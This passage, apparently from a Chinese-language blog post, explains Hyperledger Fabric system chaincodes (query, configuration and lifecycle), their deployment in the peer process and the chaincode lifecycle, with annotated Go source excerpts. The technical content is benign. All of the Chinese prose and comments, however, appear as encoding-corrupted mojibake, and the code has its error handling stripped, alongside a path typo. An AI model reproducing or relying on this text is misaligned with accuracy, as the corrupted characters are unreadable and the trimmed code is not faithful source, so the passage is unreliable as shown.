ç¼–ç¨‹è¯­è¨€çš„æ’ä»¶ã€‚ç›®å‰æ”¯æŒGoã€Javaå’ŒNodeã€‚\næ¯ä¸ªç”¨æˆ·çº§æˆ–åº”ç”¨é“¾ç éƒ½åœ¨Dockerå®¹å™¨ç¯å¢ƒä¸­çš„ç‹¬ç«‹è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œè¿™ä½¿å¾—é“¾ç å’ŒpeerèŠ‚ç‚¹ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œç®€åŒ–äº†é“¾ç çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ˆå¯åŠ¨ã€åœæ­¢ã€ä¸­æ­¢ï¼‰ã€‚é“¾ç å’ŒpeerèŠ‚ç‚¹é€šè¿‡gRCPé€šä¿¡ã€‚é€šè¿‡æ¾æ•£çš„è€¦åˆå…³ç³»ï¼ŒpeerèŠ‚ç‚¹ä¸çŸ¥é“é“¾ç å…·ä½“ä½¿ç”¨äº†ä»€ä¹ˆè¯­è¨€å®ç°ã€‚\nä¸åŒäºåº”ç”¨é“¾ç ï¼Œç³»ç»Ÿé“¾ç ç›´æ¥åœ¨peerèŠ‚ç‚¹çš„è¿›ç¨‹ä¸­è¿è¡Œï¼Œå¯ä»¥å®ç°Fabricæ‰€éœ€è¦çš„ç‰¹å®šåŠŸèƒ½ï¼Œå¯ä»¥ç”¨äºç”¨æˆ·é“¾ç ä¹‹é—´çš„éš”ç¦»é™åˆ¶è¿‡å¤šçš„æƒ…å†µã€‚\né…ç½®å’Œç³»ç»Ÿé“¾ç  Fabricé€šè¿‡é€šé“é…ç½®(channel configuration)å’Œç³»ç»Ÿé“¾ç (system chaincodes)è¿›è¡Œå®šåˆ¶ã€‚\nFabricä¸­æ¯ä¸ªé€šé“éƒ½ä¼šå½¢æˆä¸€ä¸ªé€»è¾‘åŒºå—é“¾ã€‚é€šé“çš„é…ç½®ç”±å…ƒæ•°æ®è¿›è¡Œç»´æŠ¤ï¼Œå¹¶æ°¸ä¹…ä¿ç•™åœ¨é…ç½®åŒºå—(configuration blocks)ä¸­ã€‚æ¯ä¸ªé…ç½®åŒºå—éƒ½ä¼šåŒ…å«å®Œæ•´çš„é€šé“é…ç½®ï¼Œå¹¶ä¸ä¼šåŒ…æ‹¬ä»»ä½•å…¶ä»–çš„ä¸œè¥¿ã€‚æ¯ä¸ªåŒºå—é“¾éƒ½ä»¥ä¸€ä¸ªé…ç½®åŒºå—å¼€å§‹ï¼Œç§°ä¹‹ä¸ºåˆ›ä¸–å—(genesis block)ï¼Œç”¨äºå¼•å¯¼é€šé“ã€‚é€šé“çš„é…ç½®åŒ…æ‹¬ï¼š\nå‚ä¸èŠ‚ç‚¹çš„MSPå®šä¹‰ï¼› OSNçš„ç½‘ç»œåœ°å€ï¼› å…±è¯†å®ç°å’Œé…è®¸æœåŠ¡çš„å…±äº«é…ç½®ï¼Œæ¯”å¦‚å¤§å°å’Œè¶…æ—¶ç­‰è®¾ç½®ï¼› ç®¡ç†å¯¹æ’åºæœåŠ¡æ“ä½œï¼ˆå¹¿æ’­å’Œåˆ†å‘ï¼‰è®¿é—®çš„è§„åˆ™ï¼› ç®¡ç†å¦‚ä½•ä¿®æ”¹é€šé“é…ç½®çš„å„ä¸ªéƒ¨åˆ†çš„è§„åˆ™ã€‚ é€šé“çš„é…ç½®å¯ä»¥ä½¿ç”¨é€šé“é…ç½®æ›´æ–°äº‹åŠ¡(channel configuration update transaction)è¿›è¡Œæ›´æ–°ï¼Œå…¶ä¸­éœ€è¦åŒ…æ‹¬å¯¹é…ç½®è¿›è¡Œçš„ä¿®æ”¹å’Œä¸€ç»„ç­¾åã€‚æ’åºèŠ‚ç‚¹é€šè¿‡ä½¿ç”¨å½“å‰çš„é…ç½®éªŒè¯è¯¥ç­¾åæ˜¯å¦å¾—åˆ°æˆæƒï¼Œæ¥è¯„ä¼°æ­¤æ¬¡æ›´æ–°æ˜¯å¦æœ‰æ•ˆã€‚ç„¶åï¼Œæ’åºèŠ‚ç‚¹ç”Ÿæˆä¸€ä¸ªæ–°çš„é…ç½®åŒºå—ï¼ŒåµŒå…¥æ–°çš„é…ç½®å’Œé…ç½®æ›´æ–°äº‹åŠ¡ã€‚PeerèŠ‚ç‚¹æ¥æ”¶åï¼Œæ ¹æ®å½“å‰çš„é…ç½®éªŒè¯æ›´æ–°æ˜¯å¦å¾—åˆ°äº†æˆæƒï¼Œæœ‰æ•ˆåˆ™è¿›è¡Œé…ç½®æ›´æ–°ã€‚\nåœ¨éƒ¨ç½²åº”ç”¨é“¾ç æ—¶ï¼Œä¼šå‚è€ƒä¸€ä¸ªè®¤å¯ç³»ç»Ÿé“¾ç ï¼ˆendorsement system chaincode, ESCCï¼‰å’Œä¸€ä¸ªéªŒè¯ç³»ç»Ÿé“¾ç ï¼ˆvalidation system chaincode, VSCCï¼‰ã€‚è¿™ä¸¤ä¸ªé“¾ç çš„é€‰æ‹©ä½¿å¾—ESCCè¾“å‡ºçš„èƒŒä¹¦ï¼Œå¯ä»¥ä½œä¸ºVSCCè¾“å…¥çš„ä¸€éƒ¨åˆ†è¿›è¡ŒéªŒè¯ã€‚ESCCå°†ä¸€ä¸ªææ¡ˆå’Œææ¡ˆæ¨¡æ‹Ÿçš„ç»“æœä½œä¸ºè¾“å…¥ã€‚å¦‚æœç»“æœç¬¦åˆè¦æ±‚ï¼Œåˆ™ESCCäº§ç”Ÿä¸€ä¸ªåŒ…å«ç»“æœå’Œè®¤å¯çš„å“åº”ã€‚å¯¹äºé»˜è®¤çš„ESCCï¼Œè¿™ä¸ªèƒŒä¹¦åªæ˜¯peerèŠ‚ç‚¹çš„æœ¬åœ°ç­¾åèº«ä»½çš„ç­¾åã€‚VSCCå°†ä¸€ä¸ªäº‹åŠ¡ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¾“å‡ºè¯¥äº‹åŠ¡æ˜¯å¦æœ‰æ•ˆã€‚å¯¹äºé»˜è®¤çš„VSCCï¼ŒèƒŒä¹¦è¢«æ”¶é›†ï¼Œå¹¶æ ¹æ®ä¸ºé“¾ç æŒ‡å®šçš„èƒŒä¹¦ç­–ç•¥è¿›è¡Œè¯„ä¼°ã€‚è¿›ä¸€æ­¥çš„ç³»ç»Ÿé“¾ç å®ç°å…¶ä»–æ”¯æŒåŠŸèƒ½ï¼Œå¦‚é“¾ç ç”Ÿå‘½å‘¨æœŸã€‚\nç³»ç»Ÿé“¾ç çš„æ ¸å¿ƒä»£ç åœ¨/fabric/core/common/sysccproviderå’Œ/fabric/core/sccä¸‹\nç³»ç»Ÿé“¾ç  ç³»ç»Ÿé“¾ç ç»“æ„å›¾ ä¸æ™®é€šé“¾ç å¯¹æ¯”\nç³»ç»Ÿé“¾ç  æ™®é€šé“¾ç  é“¾ç æºç  æ— mainå‡½æ•° æœ‰mainå‡½æ•° è¿è¡Œç©ºé—´ èƒŒä¹¦èŠ‚ç‚¹è¿›ç¨‹ Docker è°ƒç”¨æ–¹å¼ ç½‘ç»œ+è¿›ç¨‹å†…éƒ¨ ç½‘ç»œ å¯åŠ¨å‚æ•° å†…ç½® åŠ¨æ€è¾“å…¥ é€šä¿¡æ–¹å¼ Golangçš„é€šé“æœºåˆ¶ ç½‘ç»œ æ•°æ®å­˜å– Golangçš„é€šé“+æœ¬åœ°æ–‡ä»¶ ç½‘ç»œ å‡çº§æ–¹å¼ å’ŒèƒŒä¹¦èŠ‚ç‚¹ä¸€èµ·å‡çº§ å•ç‹¬å‡çº§ èƒŒä¹¦ç­–ç•¥ æ—  æœ‰ ç³»ç»Ÿé“¾ç åœ¨PeerèŠ‚ç‚¹ä¸Šçš„æ³¨å†Œä¸éƒ¨ç½² peerèŠ‚ç‚¹å­˜åœ¨äºdockerå®¹å™¨ä¸­ï¼Œåœ¨å¯åŠ¨æ—¶é€šè¿‡æ‰§è¡Œpeer node startå‘½ä»¤æ¥å¯åŠ¨peerèŠ‚ç‚¹ã€‚\n/internal/peer/node/start.go\nstartå‘½ä»¤çš„å…¥å£å‡½æ•°ä¸ºserveå‡½æ•°ã€‚\nä»¥ä¸‹æºä»£ç ä¸­ä»…ä¿ç•™éƒ¨ç½²ç³»ç»Ÿé“¾ç çš„éƒ¨åˆ†ã€‚\nfunc serve(args []string) error { // Initialize chaincode service // deploy system chaincodes for _, cc := range []scc.SelfDescribingSysCC{lsccInst, csccInst, qsccInst, lifecycleSCC} { if enabled, ok := chaincodeConfig.SCCWhitelist[cc.Name()]; !ok || !enabled { logger.Infof(\u0026#34;not deploying chaincode %s as it is not enabled\u0026#34;, cc.Name()) continue } // åˆ¤æ–­é“¾ç çš„è®¾ç½®æ˜¯å¦ä¸ºenabled scc.DeploySysCC(cc, chaincodeSupport) // éƒ¨ç½²ç³»ç»Ÿé“¾ç  } logger.Infof(\u0026#34;Deployed system chaincodes\u0026#34;) //... } é€šè¿‡éå†scc.SelfDescribingSysCCè¿”å›å€¼ï¼Œè°ƒç”¨scc.DeploySysCCå‡½æ•°ã€‚\næ‰¾åˆ°sccæºæ–‡ä»¶ï¼š\ncorn/scc/scc.go\ntype SelfDescribingSysCC interface { //Unique name of the system chaincode Name() string // Chaincode returns the underlying chaincode Chaincode() shim.Chaincode } SelfDescribingSysCCçš„ç¬¬äºŒä¸ªæ–¹æ³•ä¸ºChaincode()è¿”å›å€¼ä¸ºshim.Chaincodeç±»å‹ã€‚åœ¨core\\scc\\cscc\\configure.goä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š\nfunc (e *PeerConfiger) Chaincode() shim.Chaincode { return e } å¯çŸ¥start.goä¸­çš„ccä¸ºæ¯ä¸ªé“¾ç çš„é…ç½®\ntype PeerConfiger struct { policyChecker policy.PolicyChecker configMgr config.Manager aclProvider aclmgmt.ACLProvider deployedCCInfoProvider ledger.DeployedChaincodeInfoProvider legacyLifecycle plugindispatcher.LifecycleResources newLifecycle plugindispatcher.CollectionAndLifecycleResources peer *peer.Peer bccsp bccsp.BCCSP } ä¸‹é¢æ˜¯DeploySysCCçš„ä»£ç \ntype ChaincodeStreamHandler interface { HandleChaincodeStream(ccintf.ChaincodeStream) error LaunchInProc(packageID string) \u0026lt;-chan struct{} } // è´Ÿè´£peerèŠ‚ç‚¹ä¸é“¾ç ä¹‹é—´çš„é€šä¿¡ func DeploySysCC(sysCC SelfDescribingSysCC, chaincodeStreamHandler ChaincodeStreamHandler) { sysccLogger.Infof(\u0026#34;deploying system chaincode \u0026#39;%s\u0026#39;\u0026#34;, sysCC.Name()) ccid := ChaincodeID(sysCC.Name()) done := chaincodeStreamHandler.LaunchInProc(ccid) peerRcvCCSend := make(chan *pb.ChaincodeMessage) ccRcvPeerSend := make(chan *pb.ChaincodeMessage) // å¹¶è¡Œä¼ è¾“æ•°æ® go func() { stream := newInProcStream(peerRcvCCSend, ccRcvPeerSend) defer stream.CloseSend() sysccLogger.Debugf(\u0026#34;starting chaincode-support stream for %s\u0026#34;, ccid) err := chaincodeStreamHandler.HandleChaincodeStream(stream) sysccLogger.Criticalf(\u0026#34;shim stream ended with err: %v\u0026#34;, err) }() go func(sysCC SelfDescribingSysCC) { stream := newInProcStream(ccRcvPeerSend, peerRcvCCSend) defer stream.CloseSend() sysccLogger.Debugf(\u0026#34;chaincode started for %s\u0026#34;, ccid) err := shim.StartInProc(ccid, stream, sysCC.Chaincode()) sysccLogger.Criticalf(\u0026#34;system chaincode ended with err: %v\u0026#34;, err) }(sysCC) \u0026lt;-done } å› æ­¤ï¼Œåœ¨serve.goä»£ç ä¸­ï¼Œå¯¹lscc,qscc,csccä¸‰ä¸ªç³»ç»Ÿé“¾ç è¿›è¡Œç›¸åº”çš„åˆå§‹åˆ›å»ºï¼Œéšåæ ¹æ®é…ç½®ä¿¡æ¯éƒ¨ç½²åˆ°peerèŠ‚ç‚¹ä¸­ã€‚\næŸ¥è¯¢ç³»ç»Ÿé“¾ç  (Querier System Chaincode, QSCC) æºä»£ç  /core/scc/qscc/query.go\nåœ¨æ‰€æœ‰PeerèŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œæä¾›è´¦æœ¬æŸ¥è¯¢æ¥å£ï¼ŒåŒ…æ‹¬äº†åŒºå—æŸ¥è¯¢ã€äº¤æ˜“æŸ¥è¯¢ç­‰ã€‚\npackage qscc import ( \u0026#34;fmt\u0026#34; // æ ¼å¼åŒ–IO \u0026#34;strconv\u0026#34; // æ•°æ®ç±»å‹è½¬æ¢ \u0026#34;github.com/hyperledger/fabric-chaincode-go/shim\u0026#34; // shimåŒ…æä¾›APIè®¿é—®é“¾ç chaincodeçš„çŠ¶æ€å˜é‡ï¼Œchaincodeç”¨æ¥å’Œpeeræ²Ÿé€šçš„æ¥å£ pb \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; // è°ƒç”¨.pb.goæ–‡ä»¶ï¼Œç”±protoæ–‡ä»¶ç”Ÿæˆ \u0026#34;github.com/hyperledger/fabric/common/flogging\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/aclmgmt\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; // Proto Bufferçš„é€šç”¨æ–¹æ³• ) // LedgerGetter gets the PeerLedger associated with a channel. type LedgerGetter interface { GetLedger(cid string) ledger.PeerLedger } // New returns an instance of QSCC. // Typically this is called once per peer. func New(aclProvider aclmgmt.ACLProvider, ledgers LedgerGetter) *LedgerQuerier { return \u0026amp;LedgerQuerier{ aclProvider: aclProvider, ledgers: ledgers, } } // (e *LedgerQuerier) è¡¨ç¤ºè¿™æ˜¯LedgerQuerierç»“æ„ä½“çš„æ–¹æ³• func (e *LedgerQuerier) Name() string { return \u0026#34;qscc\u0026#34; } func (e *LedgerQuerier) Chaincode() shim.Chaincode { return e } // LedgerQuerier implements the ledger query functions, including: // - GetChainInfo returns BlockchainInfo // - GetBlockByNumber returns a block // - GetBlockByHash returns a block // - GetTransactionByID returns a transaction type LedgerQuerier struct { aclProvider aclmgmt.ACLProvider ledgers LedgerGetter } var qscclogger = flogging.MustGetLogger(\u0026#34;qscc\u0026#34;) // å°†å‡½æ•°åå®šä¹‰ä¸ºå­—ç¬¦ä¸²å¸¸é‡ï¼Œç”¨äºinvokeçš„ç¬¬ä¸€ä¸ªargå‚æ•° const ( GetChainInfo string = \u0026#34;GetChainInfo\u0026#34; GetBlockByNumber string = \u0026#34;GetBlockByNumber\u0026#34; GetBlockByHash string = \u0026#34;GetBlockByHash\u0026#34; GetTransactionByID string = \u0026#34;GetTransactionByID\u0026#34; GetBlockByTxID string = \u0026#34;GetBlockByTxID\u0026#34; ) // Init is called once per chain when the chain is created. // This allows the chaincode to initialize any variables on the ledger prior // to any transaction execution on the chain. func (e *LedgerQuerier) Init(stub shim.ChaincodeStubInterface) pb.Response { qscclogger.Info(\u0026#34;Init QSCC\u0026#34;) return shim.Success(nil) } // è°ƒç”¨Invokeæ—¶ï¼Œargs[0]ä¸ºæŸ¥è¯¢å‡½æ•°åï¼Œargs[1]ä¸ºchain idï¼Œåœ¨åŠ åˆ°stubåŒ…ä¹‹å‰ä¸ºæš‚æ—¶çš„id // æ¯ä¸ªå‡½æ•°éƒ½éœ€è¦é¢å¤–çš„å‚æ•°ï¼Œå¦‚ä¸‹: // # GetChainInfo: è¿”å›ä¸€ä¸ªä»¥å­—èŠ‚ä¸ºå•ä½çš„BlockchainInfoå¯¹è±¡ // # GetBlockByNumber: è¿”å›args[2]ä¸­æ‰€æŒ‡å®šçš„å— // # GetBlockByHash: è¿”å›args[2]ä¸­çš„å—å“ˆå¸Œå€¼æ‰€æŒ‡å®šçš„å— // # GetTransactionByID: è¿”å›args[2]ä¸­çš„idæ‰€æŒ‡å®šçš„äº¤æ˜“äº‹åŠ¡ func (e *LedgerQuerier) Invoke(stub shim.ChaincodeStubInterface) pb.Response { // é€šè¿‡argsè°ƒç”¨å†…éƒ¨å‡½æ•° args := stub.GetArgs() // stubæ˜¯RPCä¸­å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯ä¼ è¾“çš„æ¶ˆæ¯åŒ…ï¼Œå°†å…¶è§£åŒ…å¹¶è·å–args // argsæ•°é‡å°äº2æ—¶ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯ // ç¬¬ä¸€ä¸ªargsä¸ºè°ƒç”¨çš„å‡½æ•°åï¼Œç¬¬äºŒä¸ªargsä¸ºchain ID fname := string(args[0]) cid := string(args[1]) sp, err := stub.GetSignedProposal() // è·å–ç­¾åäº¤æ˜“æè®®çš„è§£ç å¯¹è±¡ï¼Œç±»å‹ä¸ºSignedProposal name, err := protoutil.InvokedChaincodeName(sp.ProposalBytes) targetLedger := e.ledgers.GetLedger(cid) qscclogger.Debugf(\u0026#34;Invoke function: %s on chain: %s\u0026#34;, fname, cid) // Handle ACL: ï¼ˆACLï¼šè®¿é—®æ§åˆ¶æƒé™ï¼‰ res := getACLResource(fname) if err = e.aclProvider.CheckACL(res, cid, sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s][%s]: [%s]\u0026#34;, fname, cid, err)) } // è°ƒç”¨ç›¸åº”çš„å‡½æ•°å¹¶ä¼ é€’å‚æ•° switch fname { case GetTransactionByID: return getTransactionByID(targetLedger, args[2]) case GetBlockByNumber: return getBlockByNumber(targetLedger, args[2]) case GetBlockByHash: return getBlockByHash(targetLedger, args[2]) case GetChainInfo: return getChainInfo(targetLedger) case GetBlockByTxID: return getBlockByTxID(targetLedger, args[2]) } return shim.Error(fmt.Sprintf(\u0026#34;Requested function %s not found.\u0026#34;, fname)) } // ä»¥ä¸‹ä¸ºäº”ä¸ªprivateæ–¹æ³•ï¼Œåªèƒ½é€šè¿‡invokeè¿›è¡Œè°ƒç”¨ã€‚ // äº”ä¸ªæ–¹æ³•åœ¨è¿›è¡Œå¼‚å¸¸å¤„ç†åï¼Œè°ƒç”¨è´¦æœ¬ä¸­å¯¹åº”çš„æ–¹æ³•ï¼Œå¹¶å°†æˆåŠŸæˆ–é”™è¯¯ç»“æœé€šè¿‡shimå‘é€ // - getTransactionByID: è¿”å›å¯¹åº”idçš„äº¤æ˜“å†…å®¹ func getTransactionByID(vledger ledger.PeerLedger, tid []byte) pb.Response { // å¼‚å¸¸ï¼šäº¤æ˜“ä¸ºç©º processedTran, err := vledger.GetTransactionByID(string(tid)) // è°ƒç”¨ledger.PeerLedgerä¸­çš„æ–¹æ³• bytes, err := protoutil.Marshal(processedTran) // ä½¿ç”¨protoå·¥å…·è¿›è¡Œç¼–æ’ my_TODO: read protoutil return shim.Success(bytes) } //ä»¥ä¸‹å››ä¸ªæ–¹æ³•çš„æ•´ä½“ç»“æœä¸ç¬¬ä¸€ä¸ªç›¸ä¼¼ func getBlockByNumber(vledger ledger.PeerLedger, number []byte) pb.Response { bnum, err := strconv.ParseUint(string(number), 10, 64) // è½¬æ¢æˆuintå‹ block, err := vledger.GetBlockByNumber(bnum) // è°ƒç”¨è´¦æœ¬ä¸­çš„æ–¹æ³• bytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getBlockByHash(vledger ledger.PeerLedger, hash []byte) pb.Response { block, err := vledger.GetBlockByHash(hash) bytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getChainInfo(vledger ledger.PeerLedger) pb.Response { binfo, err := vledger.GetBlockchainInfo() bytes, err := protoutil.Marshal(binfo) return shim.Success(bytes) } func getBlockByTxID(vledger ledger.PeerLedger, rawTxID []byte) pb.Response { txID := string(rawTxID) block, err := vledger.GetBlockByTxID(txID) bytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getACLResource(fname string) string { return \u0026#34;qscc/\u0026#34; + fname } Getæ–¹æ³• QSCCæä¾›çš„æ–¹æ³•éƒ½æ˜¯getæ–¹æ³•ï¼Œç”¨äºä»é€šé“ä¸­è·å–å„ç§æ•°æ®ã€‚\né…ç½®ç³»ç»Ÿé“¾ç  (Configuration System Chaincode, CSCC) /core/scc/cscc/configure.go\nCSCCç®¡ç†peerèŠ‚ç‚¹ä¸Šé€šé“ç›¸å…³çš„ä¿¡æ¯å¹¶æ‰§è¡Œé€šé“é…ç½®äº¤æ˜“\ntype PeerConfiger struct { policyChecker policy.PolicyChecker configMgr config.Manager aclProvider aclmgmt.ACLProvider deployedCCInfoProvider ledger.DeployedChaincodeInfoProvider legacyLifecycle plugindispatcher.LifecycleResources newLifecycle plugindispatcher.CollectionAndLifecycleResources peer *peer.Peer bccsp bccsp.BCCSP } CSCCä¸­æä¾›äº†PeerConfigerç±»ã€‚è¿™ä¸ªç±»å®ç°äº†peerèŠ‚ç‚¹é…ç½®ä¿¡æ¯çš„å¤„ç†ã€‚å¯¹äºæ‰€æœ‰çš„ä»æ’åºæœåŠ¡ä¸­è¿›æ¥çš„é…ç½®äº¤æ˜“ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªç³»ç»Ÿé“¾ç æ¥å¤„ç†äº¤æ˜“ã€‚\nCSCCæä¾›äº†ä¸‰ç§æ–¹æ³•\nconst ( JoinChain string = \u0026#34;JoinChain\u0026#34; GetConfigBlock string = \u0026#34;GetConfigBlock\u0026#34; GetChannels string = \u0026#34;GetChannels\u0026#34; ) JoinChainæ–¹æ³• JoinChain æ–¹æ³•ç”¨æ¥ä½¿ä¸€ä¸ªpeeråŠ å…¥é€šé“ã€‚å®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œå³é€šé“é…ç½®åŒºå—çš„åºåˆ—åŒ–çš„protobuf byteã€‚\nblock, err := protoutil.UnmarshalBlock(args[1]) cid, err := protoutil.GetChainIDFromBlock(block) // 1. æ£€æŸ¥é…ç½®å—çš„æ ¼å¼å’Œè¦æ±‚ // 2. æ£€æŸ¥åŠ å…¥çš„æ”¿ç­– // åˆå§‹åŒ–txsFilter txsFilter := util.TxValidationFlags(block.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER]) if len(txsFilter) == 0 { // add array of validation code hardcoded to valid txsFilter = util.NewTxValidationFlagsSetValue(len(block.Data.Data), pb.TxValidationCode_VALID) block.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER] = txsFilter } return e.joinChain(cid, block, e.deployedCCInfoProvider, e.legacyLifecycle, e.newLifecycle) GetConfigBlockæ–¹æ³• è¿™ä¸ªæ–¹æ³•ç”¨äºè·å–ç»™å®šé€šé“çš„å½“å‰çš„é…ç½®åŒºå—ã€‚éœ€è¦ä¸€ä¸ªå‚æ•°ï¼šé€šé“åå­—çš„byteså½¢å¼ã€‚\ncase GetConfigBlock: // 2. check policy if err = e.aclProvider.CheckACL(resources.Cscc_GetConfigBlock, string(args[1]), sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s][%s]: %s\u0026#34;, fname, args[1], err)) } return e.getConfigBlock(args[1]) GetChannelæ–¹æ³• è¿™ä¸ªæ–¹æ³•ç”¨äºè·å–peerèŠ‚ç‚¹ç›®å‰æ‰€åŠ å…¥çš„é€šé“ã€‚\ncase GetChannels: // 2. check get channels policy if err = e.aclProvider.CheckACL(resources.Cscc_GetChannels, \u0026#34;\u0026#34;, sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s]: %s\u0026#34;, fname, err)) } return e.getChannels() ç”Ÿå‘½å‘¨æœŸç³»ç»Ÿé“¾ç  (Life Cycle System Chaincode, LSCC) LSCCä¸»è¦ç®¡ç†é“¾ç çš„ç”Ÿå‘½å‘¨æœŸï¼Œä¸»è¦åŒ…æ‹¬ï¼š\nåœ¨peerèŠ‚ç‚¹ä¸Šå®‰è£…é“¾ç  åœ¨é€šé“ä¸Šéƒ¨ç½²å’Œå‡çº§é“¾ç  ç”¨æˆ·ä»è¿è¡Œä¸­çš„é“¾ç è·å–ä¿¡æ¯ é“¾ç çš„ç”Ÿå‘½å‘¨æœŸ æ‰“åŒ…é“¾ç ï¼š\nåœ¨è¢«å®‰è£…åˆ°peerèŠ‚ç‚¹ä¹‹å‰ï¼Œé“¾ç éœ€è¦è¢«æ‰“åŒ…è¿›ä¸€ä¸ª.tar.gzæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼š\u0026ldquo;metadata.json\u0026quot;å’Œå¦ä¸€ä¸ªåŒ…å«é“¾ç æ–‡ä»¶çš„æ–‡ä»¶\u0026quot;code.tar.gz\u0026rdquo;\n\u0026ldquo;metadata.json\u0026quot;åŒ…å«äº†æŒ‡å®šé“¾ç è¯­è¨€ã€ä»£ç è·¯å¾„ã€ä»¥åŠåŒ…æ ‡ç­¾çš„JSONæ–‡ä»¶ã€‚\nå®‰è£…é“¾ç ï¼š\næ¯ä¸ªè¦æ‰§è¡Œå’ŒèƒŒä¹¦äº¤æ˜“çš„peerèŠ‚ç‚¹ä¸Šéƒ½éœ€è¦å®‰è£…é“¾ç åŒ…ã€‚å®‰è£…å®Œæˆåï¼ŒpeerèŠ‚ç‚¹ä¼šæ„é€ é“¾ç ã€‚ä¸€èˆ¬å»ºè®®æ¯ä¸ªç»„ç»‡ä¸‹çš„æ‰€æœ‰peerä½¿ç”¨ç›¸åŒçš„é“¾ç åŒ…ã€‚\næ‰¹å‡†é“¾ç å®šä¹‰ï¼š\né€šè¿‡ é“¾ç å®šä¹‰ æ¥ç®¡ç†é“¾ç ã€‚å½“é€šé“æˆå‘˜æ‰¹å‡†ä¸€ä¸ªé“¾ç å®šä¹‰ï¼Œè¿™ä¸ªæ‰¹å‡†ä¾¿ä½œä¸ºä¸€ä¸ªç»„ç»‡åœ¨æ¥å—é“¾ç å‚æ•°æ–¹é¢çš„æŠ•ç¥¨ã€‚è¿™äº›åŒæ„çš„ç»„ç»‡å®šä¹‰å…è®¸é€šé“æˆå‘˜åœ¨é“¾ç å¯ä»¥åœ¨é€šé“ä¸Šä½¿ç”¨ä¹‹å‰è¾¾æˆä¸€è‡´æ„è§ï¼ˆåŒæ„é“¾ç è¿è¡Œåœ¨æ­¤é€šé“ä¸Šï¼‰ã€‚\né“¾ç å®šä¹‰åŒ…å«ä»¥ä¸‹å‚æ•°ï¼ˆéœ€è¦åœ¨ç»„ç»‡ä¹‹é—´ä¿æŒä¸€è‡´ï¼‰ï¼šåç§°ã€ç‰ˆæœ¬ã€åºåˆ—å·ã€èƒŒä¹¦ç­–ç•¥ã€ç§æœ‰æ•°æ®é›†åˆé…ç½®ã€ECSS/VSCCæ’ä»¶ã€åˆå§‹åŒ–\næäº¤é“¾ç å®šä¹‰åˆ°é€šé“ï¼š\nè¶³å¤Ÿå¤šçš„æˆå‘˜åŒæ„ä¸€ä¸ªé“¾ç å®šä¹‰åï¼ŒæŸä¸ªç»„ç»‡èƒ½å¤Ÿæäº¤å®šä¹‰åˆ°é€šé“ã€‚æäº¤äº¤æ˜“é¦–å…ˆå‘é€ç»™é€šé“æˆå‘˜çš„peerèŠ‚ç‚¹ï¼ŒpeerèŠ‚ç‚¹ä¼šæŸ¥è¯¢é“¾ç å®šä¹‰çš„è¢«åŒæ„çŠ¶å†µï¼Œç¡®è®¤ç»„ç»‡åŒæ„åä¸ºå…¶èƒŒä¹¦ï¼Œäº¤æ˜“éšåè¢«æäº¤åˆ°æ’åºæœåŠ¡ï¼Œæ’åºæœåŠ¡ä¼šæŠŠé“¾ç å®šä¹‰æäº¤ç»™é€šé“ã€‚\næºä»£ç  éƒ¨ç½²æ—¶çš„config\nlsccInst := \u0026amp;lscc.SCC{ BuiltinSCCs: builtinSCCs, // type: FilesystemSupport // Supportæä¾›äº†ä¸€äº›é™æ€å‡½æ•°çš„å®ç° Support: \u0026amp;lscc.SupportImpl{ GetMSPIDs: peerInstance.GetMSPIDs, }, // type: sysccprovider.SystemChaincodeProvider // SCCProvideræ˜¯ç”¨äºè®¿é—®ç³»ç»Ÿå…¶ä»–éƒ¨åˆ†çš„æ¥å£ SCCProvider: \u0026amp;lscc.PeerShim{Peer: peerInstance}, // type: aclmgmt.ACLProvider // ACLProviderè´Ÿè´£è®¿é—®æƒé™æ§åˆ¶ ACLProvider: aclProvider, GetMSPIDs: peerInstance.GetMSPIDs, // type: policy.PolicyChecker // PolicyCheckeræ˜¯ç”¨äºæ‰§è¡Œè®¿é—®æ§åˆ¶çš„æ¥å£ PolicyChecker: policyChecker, BCCSP: factory.GetDefault(), BuildRegistry: buildRegistry, ChaincodeBuilder: containerRouter, EbMetadataProvider: ebMetadataProvider, } /core/scc/lscc/lscc.go\nInvokeä»£ç çš„å½¢å¼ä¸QSCCéƒ¨åˆ†ç±»ä¼¼ï¼Œéƒ½æ˜¯ä½¿ç”¨switchè¯­å¥é€‰æ‹©æ‰€è°ƒç”¨çš„æ–¹æ³•ï¼ˆå°†å‡½æ•°åå®šä¹‰ä¸ºå¸¸é‡ï¼‰\nç”±äºä»£ç è¿‡é•¿ï¼Œä»¥ä¸‹ä»£ç çœç•¥å¼‚å¸¸å¤„ç†éƒ¨åˆ†ï¼š\nfunc (lscc *SCC) Invoke(stub shim.ChaincodeStubInterface) pb.Response { args := stub.GetArgs() function := string(args[0]) // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°å switch function { case INSTALL: depSpec := args[1] err := lscc.executeInstall(stub, depSpec) // æ ¹æ®ç¬¬äºŒä¸ªå‚æ•° deployment spec å®‰è£…é“¾ç  return shim.Success([]byte(\u0026#34;OK\u0026#34;)) case DEPLOY, UPGRADE: // è‡³å°‘æœ‰ä¸‰ä¸ªå‚æ•°ï¼š å‡½æ•°åï¼Œé“¾ç åå’Œdeployment spec channel := string(args[1]) ac, exists := lscc.SCCProvider.GetApplicationConfig(channel) // 